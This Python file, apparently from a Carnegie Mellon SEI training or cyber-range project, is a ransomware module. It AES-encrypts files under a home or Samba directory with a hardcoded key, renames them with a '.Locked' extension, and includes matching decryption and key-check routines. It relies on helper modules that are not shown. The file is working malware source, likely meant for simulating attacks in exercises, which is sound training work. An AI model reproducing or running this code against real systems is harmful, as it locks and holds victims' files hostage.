
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import Cryptodome.Cipher
import Cryptodome.Util
from pathlib import Path
from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
from Cryptodome import Random
import discover
import os, base64, time
import migrate

# -----------------
# GLOBAL VARIABLES
# -----------------
HARDCODED_KEY = '_H3r3S___J0hNny_'

START_DIR = '/home/user/' if migrate.get_ip() != '10.3.3.149' else '/home/samba'

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
    
def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)
                    
def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")
                                    
def encrypt_file(file, key=HARDCODED_KEY):
    plaintext = base64.b64encode(file[1])
    enc = encrypt(plaintext, key.encode())
    with open(file[0] + ".Locked", 'wb') as f:
        f.write(enc)
                                                                        
def decrypt_file(file, key=HARDCODED_KEY):
    dec = decrypt(file[1], key.encode())
    dec = base64.b64decode(dec)
    with open(file[0][:-7], 'wb') as f:
        f.write(dec)
                                                                                                            
def decrypt_all(key=HARDCODED_KEY):
    #files = discover.discoverFiles(START_DIR)
    for f in discover.discoverFiles(START_DIR):
        try:
            decrypt_file(f)
        except Exception as e:
            print(f"Error:\t {e}")

def check_key(key):
    if key == HARDCODED_KEY:
        print("Key Match")
        return True
    else:
        print("Key no match")
        return False


def check_encrypted():
    '''
    returns true if the first file in the first directory has the encrypted extension
    '''
    first_file_generator=discover.discoverFiles(START_DIR,check_encrypt=True)
    for file in first_file_generator:
        if file.endswith('.Locked'):
            return True
        else:
            return False

